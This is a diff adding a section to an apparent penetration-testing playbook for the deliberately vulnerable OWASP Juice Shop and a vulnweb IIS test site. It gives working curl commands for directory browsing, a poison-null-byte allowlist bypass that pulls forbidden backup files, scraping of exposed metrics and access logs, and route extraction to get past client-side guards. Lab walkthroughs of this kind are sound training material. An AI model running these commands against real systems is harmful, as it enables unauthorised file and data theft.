@@ -178,6 +178,79 @@ done
 
 ---
 
+## Phase 5.5 — Juice Shop: /ftp Directory Listing, Poison Null Byte & Route-Table Extraction
+
+OWASP Juice Shop (base `http://localhost:3000`, SQLite backend, Angular SPA with **client-side-only** route guards/validation, auto-CRUD REST at `/api/{Model}` and `/rest/{noun}`) ships an Express `/ftp` static dir that is fully browsable. The download route only *allowlists* `.md`/`.pdf` extensions — a poison null byte truncates the filename so the server serves arbitrary files while the allowlist still "sees" a `.md`. Angular's route table (Score Board, Admin) is shipped in `main.js` and only guarded in the browser.
+
+### P1 — `/ftp` browse + Poison-Null-Byte allowlist bypass
+
+```bash
+BASE="http://localhost:3000"
+
+# (1) The /ftp static dir is directory-listing enabled — just browse it
+curl -s "$BASE/ftp/" | grep -oE 'href="[^"]+"'   # lists every file in the FTP root
+
+# (2) Directly grab the allowed .md/.pdf files (no bypass needed)
+curl -s -o acquisitions.md      "$BASE/ftp/acquisitions.md"        # Confidential Document
+# -> unlocks "Confidential Document"
+
+# (3) Poison Null Byte: download FORBIDDEN extensions (.bak/.kdbx/.gz/.tar.gz/.json)
+#     by truncating the name BEFORE the allowlisted .md suffix.
+#     %2500 = DOUBLE-encoded %00 (the proxy/Angular decodes once, Node sees %00 -> NUL)
+curl -s -o package.json.bak  "$BASE/ftp/package.json.bak%2500.md"      # Forgotten Dev Backup
+curl -s -o coupons_2013.md.bak "$BASE/ftp/coupons_2013.md.bak%2500.md" # Forgotten Sales Backup
+curl -s -o eastere.gg        "$BASE/ftp/eastere.gg%2500.md"            # Easter Egg (.b/.gg)
+# Any one %2500 download of a non-.md/.pdf file -> unlocks "Poison Null Byte"
+```
+
+Unlocks: **Confidential Document** (`/ftp/acquisitions.md`), **Forgotten Developer Backup** (`package.json.bak`), **Forgotten Sales Backup** (`coupons_2013.md.bak`), **Easter Egg** (`eastere.gg` → base64/ROT13 decode to the `.b` egg URL), **Poison Null Byte** (the `%2500` bypass itself).
+
+### P2 — Adjacent leak surfaces + Angular route-table extraction
+
+```bash
+BASE="http://localhost:3000"
+
+# Prometheus metrics endpoint (operational + internal counter leak)
+curl -s "$BASE/metrics" | head -20          # -> unlocks "Exposed Metrics" challenge
+
+# Exposed log directory (request/access logs served as static files)
+curl -s "$BASE/support/logs/" | grep -oE 'href="[^"]+"'
+curl -s "$BASE/support/logs/access.log" | tail -20   # IPs, tokens, coupon usage
+
+# SIEM / detection-rule artifacts sometimes left in /ftp or /support
+for ext in yar yaral yml sigma rules; do
+  curl -s -o /dev/null -w "%{http_code} $ext\n" "$BASE/ftp/rules.$ext%2500.md"
+done
+
+# Extract the Angular client-side route table from the main bundle.
+# Guards (Score Board, Admin) are enforced ONLY in the browser — the route
+# strings are shipped to every client, so we can navigate straight to them.
+MAIN=$(curl -s "$BASE/" | grep -oE 'main[^"]*\.js' | head -1)
+curl -s "$BASE/$MAIN" | grep -oE 'path:"[^"]*"' | sort -u   # full route list
+# Look for "score-board" and "administration" -> visit directly:
+#   http://localhost:3000/#/score-board     -> unlocks "Score Board"
+#   http://localhost:3000/#/administration  -> unlocks "Admin Section" (needs admin JWT)
+```
+
+Unlocks: **Exposed Metrics** (`/metrics`), and the route-table leak directly enables **Score Board** (`/#/score-board`) and **Admin Section** (`/#/administration`) by bypassing the client-only Angular route guards.
+
+### testaspnet — IIS directory-listing / "Index of /" probe
+
+For ASP.NET/IIS targets (e.g. `testaspnet.vulnweb.com`), the equivalent of `/ftp` browsing is an IIS dir-listing left enabled. Detect the IIS "Index of /" / directory-browsing fingerprint:
+
+```bash
+T="http://testaspnet.vulnweb.com"
+for D in / /Images/ /Templates/ /aspnet_client/ /App_Data/ /bin/ /Uploads/; do
+  BODY=$(curl -s "$T$D")
+  echo "$BODY" | grep -qiE '<title>[^<]*(Index of|Directory Listing)|Parent Directory|<pre>.*\[To Parent' \
+    && echo "[+] IIS directory listing enabled at $T$D"
+done
+# Confirm via Server header + classic IIS listing markup
+curl -sI "$T/" | grep -i '^Server:'   # Microsoft-IIS/x.y
+```
+
+---
+
 ## Phase 6 — .DS_Store File Listing
 
 ```bash
